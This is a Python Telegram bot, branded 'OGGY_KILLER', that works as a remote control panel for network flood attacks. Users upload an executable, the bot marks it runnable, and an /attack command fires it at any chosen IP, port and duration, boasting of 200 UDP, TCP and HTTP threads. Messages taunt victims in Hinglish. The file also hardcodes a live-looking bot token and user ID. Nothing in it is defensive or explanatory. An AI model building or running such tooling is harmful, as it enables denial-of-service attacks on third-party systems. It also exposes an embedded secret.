#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import threading
import signal
import time
import shutil
from datetime import datetime
from pathlib import Path

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
except ImportError:
    print("[!] Install python-telegram-bot: pip install python-telegram-bot==20.0")
    sys.exit(1)

# ==================== CONFIG ====================
BOT_TOKEN = "8736196701:AAEMP3Hw8cNZ4lzHBT3NXXJEK12JoyrwplE"       # @BotFather se lo
ALLOWED_USERS = [8477195695]                      # Empty = sabko allow, ya ["123456789"]
BINARY_NAME = "oggy"                    # Uploaded binary ka naam
BINARY_PATH = f"./{BINARY_NAME}"        # Current directory mein save
CURRENT_DIR = os.getcwd()
# =================================================

# Global variables
attack_thread = None
attack_running = False
current_attack_info = {}

# ---------- Helper Functions ----------
def check_binary_exists():
    """Check if binary exists and is executable"""
    path = Path(BINARY_PATH)
    if not path.exists():
        return False, "Binary file not found"
    if not os.access(BINARY_PATH, os.X_OK):
        return False, "Binary exists but not executable (chmod +x needed)"
    return True, "Binary exists and is executable"

def test_binary():
    """Run binary with --help or no args to test"""
    try:
        # Run with no args, it should show usage (we expect return code 1)
        result = subprocess.run([BINARY_PATH], capture_output=True, text=True, timeout=5)
        # If it prints usage, it's working
        if "Usage:" in result.stdout or "Usage:" in result.stderr:
            return True, "Binary working (shows usage)"
        else:
            return False, "Binary ran but didn't show usage - may still work"
    except Exception as e:
        return False, f"Binary test failed: {e}"

def run_attack(ip, port, time_sec):
    global attack_running
    attack_running = True
    cmd = [BINARY_PATH, ip, str(port), str(time_sec)]
    
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # Read output in real-time (optional, we just wait)
        process.wait()
        attack_running = False
        return True
    except Exception as e:
        print(f"[ERROR] Attack failed: {e}")
        attack_running = False
        return False

# ---------- Telegram Handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ CHUMT KA GULAM, tu allowed nahi hai!")
        return
    
    keyboard = [
        [InlineKeyboardButton("📤 Upload Binary", callback_data='upload')],
        [InlineKeyboardButton("🎯 Attack Now", callback_data='attack')],
        [InlineKeyboardButton("📊 Status", callback_data='status')],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data='stop')],
        [InlineKeyboardButton("ℹ️ Help", callback_data='help')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"😈🔥 **OGGY_KILLER TELEGRAM BOT** 🔥😈\n\n"
        f"CHUMT KE PYASA, welcome!\n"
        f"Binary upload kar, attack shuru kar, maza le!\n\n"
        f"**Commands:**\n"
        f"/upload - Send binary file\n"
        f"/attack <IP> <PORT> <TIME> - Start attack\n"
        f"/status - Check binary & attack status\n"
        f"/stop - Stop current attack\n"
        f"/help - Show help\n\n"
        f"👿 Developer: @OGGY",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded file (binary)"""
    user_id = str(update.effective_user.id)
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Tu allowed nahi hai!")
        return
    
    # Check if user sent a file
    if not update.message.document:
        await update.message.reply_text("❌ Koi file attach nahi kiya! /upload command ke sath file bhejo.")
        return
    
    document = update.message.document
    file_name = document.file_name
    file_size = document.file_size
    
    # Optional: check file size (max 10 MB)
    if file_size > 10 * 1024 * 1024:
        await update.message.reply_text("❌ File 10 MB se badi hai! Chhoti file daal.")
        return
    
    # Download file
    try:
        file = await document.get_file()
        # Save as BINARY_NAME
        file_path = BINARY_PATH
        await file.download_to_drive(file_path)
        
        # Make executable
        os.chmod(file_path, 0o755)  # rwxr-xr-x
        
        # Verify
        exists, msg = check_binary_exists()
        if not exists:
            await update.message.reply_text(f"❌ Upload failed: {msg}")
            return
        
        # Test binary
        test_ok, test_msg = test_binary()
        if test_ok:
            await update.message.reply_text(
                f"✅ **Binary uploaded & ready!**\n\n"
                f"📁 File: `{BINARY_PATH}`\n"
                f"🔧 Permissions: Executable (chmod +x)\n"
                f"🧪 Test: {test_msg}\n\n"
                f"🔥 Now you can use `/attack <IP> <PORT> <TIME>`\n"
                f"Example: `/attack 192.168.1.1 80 60`",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                f"⚠️ Binary uploaded but test failed: {test_msg}\n"
                f"Still you can try `/attack` command.",
                parse_mode='Markdown'
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Upload error: {e}")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_thread, attack_running, current_attack_info
    user_id = str(update.effective_user.id)
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Tu allowed nahi hai!")
        return
    
    # Check binary exists
    exists, msg = check_binary_exists()
    if not exists:
        await update.message.reply_text(f"❌ Binary not ready: {msg}\nUpload karo pehle /upload se.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ **Usage:** `/attack <IP> <PORT> <TIME>`\n"
            "Example: `/attack 192.168.1.1 80 60`",
            parse_mode='Markdown'
        )
        return
    
    ip = args[0]
    port = int(args[1])
    time_sec = int(args[2])
    
    if attack_running:
        await update.message.reply_text("⚠️ Attack already running! Use /stop first.")
        return
    
    current_attack_info = {
        'ip': ip,
        'port': port,
        'time': time_sec,
        'started': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    await update.message.reply_text(
        f"🔥 **ATTACK LAUNCHED!** 🔥\n\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱️ Duration: `{time_sec} sec`\n"
        f"💀 Threads: `200` (UDP+TCP+HTTP)\n"
        f"👿 OGGY says: CHUMT KA DARINDA ne shuru kar diya!\n\n"
        f"Use /status to monitor.",
        parse_mode='Markdown'
    )
    
    attack_thread = threading.Thread(target=run_attack, args=(ip, port, time_sec))
    attack_thread.daemon = True
    attack_thread.start()

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Tu allowed nahi hai!")
        return
    
    # Check binary
    exists, msg = check_binary_exists()
    binary_status = "✅ Ready" if exists else f"❌ {msg}"
    
    # Check attack
    if attack_running:
        info = current_attack_info
        attack_status = (
            f"🔴 **RUNNING**\n"
            f"🎯 {info.get('ip', 'N/A')}:{info.get('port', 'N/A')}\n"
            f"⏱️ {info.get('time', 'N/A')} sec\n"
            f"🕒 Started: {info.get('started', 'N/A')}"
        )
    else:
        attack_status = "🟢 IDLE"
    
    await update.message.reply_text(
        f"📊 **OGGY STATUS**\n\n"
        f"**Binary:** {binary_status}\n"
        f"**Attack:** {attack_status}\n\n"
        f"Commands: /upload, /attack, /stop, /help",
        parse_mode='Markdown'
    )

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    user_id = str(update.effective_user.id)
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Tu allowed nahi hai!")
        return
    
    if attack_running:
        # Send SIGINT to the main process (this will stop attack thread)
        os.kill(os.getpid(), signal.SIGINT)
        attack_running = False
        await update.message.reply_text(
            "🛑 **ATTACK STOPPED!** 🛑\n\n"
            "CHUMT KA GULAM bach gaya! 😂\n"
            "OGGY says: Agli baar phir milenge!"
        )
    else:
        await update.message.reply_text("⚠️ Koi attack nahi chal raha.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🤖 **OGGY_KILLER BOT HELP**\n\n"
        f"**Commands:**\n"
        f"`/start` - Main menu\n"
        f"`/upload` - Send binary file (attachment) to upload\n"
        f"`/attack <IP> <PORT> <TIME>` - Start attack\n"
        f"`/status` - Check binary & attack status\n"
        f"`/stop` - Stop current attack\n"
        f"`/help` - This help\n\n"
        f"**Example:**\n"
        f"1. Upload: /upload (attach file)\n"
        f"2. Attack: /attack 1.2.3.4 80 30\n\n"
        f"👿 Developer: @OGGY",
        parse_mode='Markdown'
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'upload':
        await query.edit_message_text(
            "📤 **Upload Binary**\n\n"
            "Send the compiled binary file as a document.\n"
            "Just type `/upload` and attach the file.\n\n"
            "Make sure it's compiled for Linux (ARM/x86).",
            parse_mode='Markdown'
        )
    elif query.data == 'attack':
        await query.edit_message_text(
            "🎯 **Attack Command**\n\n"
            "Use: `/attack <IP> <PORT> <TIME>`\n"
            "Example: `/attack 192.168.1.1 80 60`\n\n"
            "Make sure binary is uploaded and executable first.",
            parse_mode='Markdown'
        )
    elif query.data == 'status':
        await status(update, context)
    elif query.data == 'stop':
        await stop(update, context)
    elif query.data == 'help':
        await help_command(update, context)

# ---------- Main ----------
def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("[!] Bot token set karo! @BotFather se lo.")
        sys.exit(1)
    
    print("🔥 OGGY_KILLER BOT STARTING...")
    print(f"🤖 Token: {BOT_TOKEN[:10]}...")
    print(f"📁 Binary path: {BINARY_PATH}")
    print("💀 CHUMT KA DARINDA ready!\n")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("upload", upload_handler))  # This will be handled by message handler too
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("help", help_command))
    
    # Message handler for file uploads (if user sends file directly without /upload)
    app.add_handler(MessageHandler(filters.Document.ALL, upload_handler))
    
    # Callback for inline buttons
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("🤖 Bot running... Press Ctrl+C to stop")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()